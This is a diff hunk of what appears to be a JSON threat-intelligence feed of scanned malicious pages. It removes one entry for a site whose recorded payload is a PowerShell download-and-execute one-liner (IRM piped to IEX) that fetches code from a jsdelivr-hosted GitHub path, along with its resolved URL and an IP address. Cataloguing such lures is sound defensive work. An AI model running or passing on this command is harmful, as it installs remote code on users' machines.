@@ -5335,22 +5335,5 @@
     ],
     "ReportId": "cmwbi8kbf07op0nmlm3jwx96u",
     "ScannedAt": "2026-11-11T02:33:25.268000+00:00"
-  },
-  {
-    "UrlDomain": "www.cleversources.com",
-    "DeliveryUrl": [
-      "fastly.jsdelivr.net"
-    ],
-    "PayloadUrl": [],
-    "IP": [
-      "83.133.245.163"
-    ],
-    "Related": [],
-    "Payload": "IRM fastly[.]jsdelivr[.]net/g\"h\"/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa | IEX",
-    "ResolvedDownloadUrl": [
-      "https://fastly.jsdelivr.net/gh/wiktor1992kl/sds37465-df459-kcne8xhf-ajdf55/ea25409061fa"
-    ],
-    "ReportId": "cmwbi0g9507kw0nmljk124v3m",
-    "ScannedAt": "2026-11-11T02:27:06.700000+00:00"
   }
 ]
